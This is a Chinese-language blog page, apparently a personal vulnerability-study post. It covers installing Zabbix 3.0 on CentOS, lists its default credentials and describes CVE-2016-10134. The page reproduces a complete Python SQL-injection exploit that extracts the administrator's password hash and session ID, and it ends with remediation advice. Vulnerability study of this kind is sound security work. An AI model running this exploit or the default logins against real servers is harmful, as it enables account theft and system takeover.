@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="鸡翅儿">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Zabbix 安装部署安装环境 OS：CentOS 7.2 64bitZabbix版本：3.0.24MySQL版本：5.7注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。  安装步骤 关闭selinux和iptables [root@test ~]# systemctl stop firewalld.service[root@test ~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zabbix（分布式系统监视）漏洞学习">
+<meta property="og:url" content="http://wcute.github.io/2018/12/21/Zabbix（分布式系统监视）漏洞学习/index.html">
+<meta property="og:site_name" content="鸡翅儿">
+<meta property="og:description" content="Zabbix 安装部署安装环境 OS：CentOS 7.2 64bitZabbix版本：3.0.24MySQL版本：5.7注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。  安装步骤 关闭selinux和iptables [root@test ~]# systemctl stop firewalld.service[root@test ~">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-0e91ffca04314521.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-4745086aaa626e7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-79d6b578fd713628.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-21T06:37:17.850Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Zabbix（分布式系统监视）漏洞学习">
+<meta name="twitter:description" content="Zabbix 安装部署安装环境 OS：CentOS 7.2 64bitZabbix版本：3.0.24MySQL版本：5.7注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。  安装步骤 关闭selinux和iptables [root@test ~]# systemctl stop firewalld.service[root@test ~">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-0e91ffca04314521.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wcute.github.io/2018/12/21/Zabbix（分布式系统监视）漏洞学习/">
+
+
+
+
+
+  <title>Zabbix（分布式系统监视）漏洞学习 | 鸡翅儿</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">鸡翅儿</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/21/Zabbix（分布式系统监视）漏洞学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Zabbix（分布式系统监视）漏洞学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-21T14:36:23+08:00">
+                2018-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Zabbix-安装部署"><a href="#Zabbix-安装部署" class="headerlink" title="Zabbix 安装部署"></a>Zabbix 安装部署</h3><h4 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h4><blockquote>
+<p>OS：CentOS 7.2 64bit<br>Zabbix版本：3.0.24<br>MySQL版本：5.7<br>注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。</p>
+</blockquote>
+<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><ol>
+<li>关闭<code>selinux</code>和<code>iptables</code><blockquote>
+<p>[root@test ~]# systemctl stop firewalld.service<br>[root@test ~]# setenforce 0<br>setenforce: SELinux is disabled</p>
+</blockquote>
+</li>
+<li>安装<code>Zabbix rpm</code>包仓库<blockquote>
+<p>[root@test ~]# rpm -vhi <a href="http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm" target="_blank" rel="noopener">http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm</a></p>
+</blockquote>
+</li>
+<li>安装<code>zabbix-server-mysql</code>和<code>zabbix-web-mysql</code><blockquote>
+<p>[root@test ~]# yum install -y zabbix-server-mysql zabbix-web-mysql</p>
+</blockquote>
+</li>
+<li>启动<code>mysql</code><blockquote>
+<p>[root@test ~]# systemctl start mysqld<br>[root@test ~]# /sbin/chkconfig mysqld on #开机启动<br>[root@test ~]# mysql_secure_installation #初始化数据库信息</p>
+</blockquote>
+</li>
+<li>创建<code>zabbix</code>数据库，创建<code>zabbix</code>账号<blockquote>
+<p>[root@test ~]# mysql -uroot -p<br>mysql&gt;  create database zabbix character set utf8 collate utf8_bin;<br>Query OK, 1 row affected (0.00 sec)<br>mysql&gt; grant all privileges on zabbix.* to ‘zabbix‘@’localhost’ identified by ‘zabbix’;<br>Query OK, 0 rows affected (0.00 sec)<br>mysql&gt; flush privileges;<br>Query OK, 0 rows affected (0.01 sec)</p>
+</blockquote>
+</li>
+<li>导入默认的<code>zabbix</code>数据库信息<blockquote>
+<p>[root@test ~]# zcat /usr/share/doc/zabbix-server-mysql-3.0.24/create.sql.gz | mysql zabbix -uzabbix -pzabbix</p>
+</blockquote>
+</li>
+<li>修改<code>zabbix_server.conf</code>的配置文件<blockquote>
+<p>[root@test ~]#  grep ^DB /etc/zabbix/zabbix_server.conf<br>DBName=zabbix<br>DBUser=zabbix<br>DBPassword=zabbix</p>
+</blockquote>
+</li>
+<li>修改配置文件<code>/etc/httpd/conf.d/zabbix.conf</code>，时区改成 Asia/Shanghai<blockquote>
+<p>php_value date.timezone Asia/Shanghai</p>
+</blockquote>
+</li>
+<li>启动<code>apache</code> <code>zabbix-server</code>服务并设置为开机启动<blockquote>
+<p>[root@test ~]# systemctl start httpd<br>[root@test ~]# systemctl enable httpd<br>[root@test ~]# netstat -an |grep 80<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN<br>[root@test ~]# systemctl start zabbix-server<br>[root@test ~]# systemctl enable zabbix-server</p>
+</blockquote>
+</li>
+<li>访问<code>http://ip/zabbix/setup.php</code>进入安装页面<blockquote>
+<p>Next step-Next step-配置zabbix-Next step-Next step-Finsh</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-0e91ffca04314521.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="11">
+<li>默认账号<code>Admin</code> 密码<code>zabbix</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-4745086aaa626e7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>移除或改名web目录下面的<code>setup.php</code>文件<blockquote>
+<p>[root@test ~]# cd /usr/share/zabbix/<br>[root@test zabbix]# mv setup.php setup.php.bak</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="Zabbix-默认密码"><a href="#Zabbix-默认密码" class="headerlink" title="Zabbix 默认密码"></a>Zabbix 默认密码</h3><p>弱口令<br>WeapPassword = [(“admin”,”zabbix”),(“Admin”,”zabbix”),(“guest”,””)]</p>
+<h3 id="zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><a href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）" class="headerlink" title="zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h3><p>漏洞详情：latest.php处toogle_ids[]参数SQL注入，可获取系统权限<br>利用条件：登录后<br>影响版本：2.2.x, 3.0.x<br>漏洞复现：<a href="https://www.jianshu.com/p/40a0e8238878" target="_blank" rel="noopener">https://www.jianshu.com/p/40a0e8238878</a></p>
+<h3 id="注入检测EXP"><a href="#注入检测EXP" class="headerlink" title="注入检测EXP"></a>注入检测EXP</h3><p>附上大佬的EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Date: 2016/8/18</span><br><span class="line"># Modified by: Jamin Zhang</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import sys, os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def deteck_Sql():</span><br><span class="line">    u&apos;检查是否存在 SQL 注入&apos;</span><br><span class="line">    payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=10).read()</span><br><span class="line">    except Exception, msg:</span><br><span class="line">        print msg</span><br><span class="line">    else:</span><br><span class="line">        key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;)</span><br><span class="line">        if key_reg.findall(response):</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sql_Inject(sql):</span><br><span class="line">    u&apos;获取特定sql语句内容&apos;</span><br><span class="line">    payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote(</span><br><span class="line">        sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=10).read()</span><br><span class="line">    except Exception, msg:</span><br><span class="line">        print msg</span><br><span class="line">    else:</span><br><span class="line">        result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        if results:</span><br><span class="line">            return results[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    # os.system([&apos;clear&apos;, &apos;cls&apos;][os.name == &apos;nt&apos;])</span><br><span class="line">    print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;</span><br><span class="line">    print u&apos;\t   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit&apos;</span><br><span class="line">    print &apos;\t    Origin Author: http://www.waitalone.cn/&apos;</span><br><span class="line">    print &apos;\t\t   Modified by: Jamin Zhang&apos;</span><br><span class="line">    print &apos;\t\t   Date: 2016-08-18&apos;</span><br><span class="line">    print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix Server Web 后台 URL]&apos;</span><br><span class="line">        print u&apos;实例: &apos; + os.path.basename(sys.argv[0]) + &apos; http://jaminzhang.github.io&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    if url[-1] != &apos;/&apos;: url += &apos;/&apos;</span><br><span class="line">    passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    if deteck_Sql():</span><br><span class="line">        print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos;</span><br><span class="line">        print u&apos;管理员  用户名密码：%s&apos; % sql_Inject(passwd_sql)</span><br><span class="line">        print u&apos;管理员  Session_id：%s&apos; % sql_Inject(session_sql)</span><br><span class="line">    else:</span><br><span class="line">        print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-79d6b578fd713628.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭 guest 访问权限，加强管理员密码强度<br>对zabbix后台做访问控制，只允许指定IP访问zabbix-server后台</p>
+<p>参考链接：<br><a href="https://www.cnblogs.com/xiewenming/p/7732144.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiewenming/p/7732144.html</a><br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/21/zabbix  SQL注入漏洞复现/" rel="next" title="zabbix  SQL注入漏洞复现">
+                <i class="fa fa-chevron-left"></i> zabbix  SQL注入漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">wcute</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Zabbix-安装部署"><span class="nav-number">1.</span> <span class="nav-text">Zabbix 安装部署</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安装环境"><span class="nav-number">1.1.</span> <span class="nav-text">安装环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安装步骤"><span class="nav-number">1.2.</span> <span class="nav-text">安装步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Zabbix-默认密码"><span class="nav-number">2.</span> <span class="nav-text">Zabbix 默认密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><span class="nav-number">3.</span> <span class="nav-text">zabbix latest.php SQL注入漏洞（CVE-2016-10134）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入检测EXP"><span class="nav-number">4.</span> <span class="nav-text">注入检测EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">5.</span> <span class="nav-text">修复建议</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wcute</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
